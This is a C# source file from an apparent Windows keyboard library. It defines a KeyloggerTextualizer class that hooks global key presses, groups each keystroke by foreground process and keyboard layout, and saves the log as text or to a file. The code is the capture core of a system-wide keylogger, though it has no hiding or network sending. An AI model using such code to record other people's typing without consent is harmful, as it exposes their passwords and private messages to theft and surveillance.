using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using nucs.Windows.Processes;
using ProtoBuf;

namespace nucs.Windows.Keyboard.Highlevel {

    [ProtoContract]
    public class KeyloggerTextualizer : KeyboardLogger {

        public KeyloggerTextualizer(bool IsConsoleApp = false) : base(IsConsoleApp) {
            base.KeyPress += OnKeyPress;
        }

        [ProtoMember(1)]
        public List<ProcessLog> ActiveLogs = new List<ProcessLog>();

        /// <summary>
        ///     Handles a key press event
        /// </summary>
        private void OnKeyPress(BaseKeyboardManager sender, HotkeyEventArgs args) {
            //handles which process was it hit on,

            var topmost = ProcessFinder.GetForegroundProcess().ToProcessInfo();

            var topmost_log = ActiveLogs.FirstOrDefault(log => log.Process.Equals(topmost));
            if (topmost_log == null)
                ActiveLogs.Add(topmost_log = new ProcessLog() { Process = topmost });
            //Convert Hotkey to LogKey - includes in keyboardlayout
            var lk = new LogKey { Key = args.Hotkey.Key, Modifiers = args.Hotkey.Modifiers, KeyboardLayout = KeyboardLanguage.GetCurrentKeyboardLayout() }; //67699721 hebrew?
            topmost_log.AddContent(lk);
        }

        public string Output() {
            var sb = new StringBuilder();
            foreach (var p in ActiveLogs.ToArray()) {
                sb.AppendLine("---Process: " + p.Process.Name);
                foreach (var line in p.Logs) {
                    sb.AppendLine(line.ToStringKeyGuide());
                }
            }
            return sb.ToString();
        }
        
        public void Output(FileInfo fi, bool append=false) {
            Output().SaveAs(fi,append);
        }
        
    }
}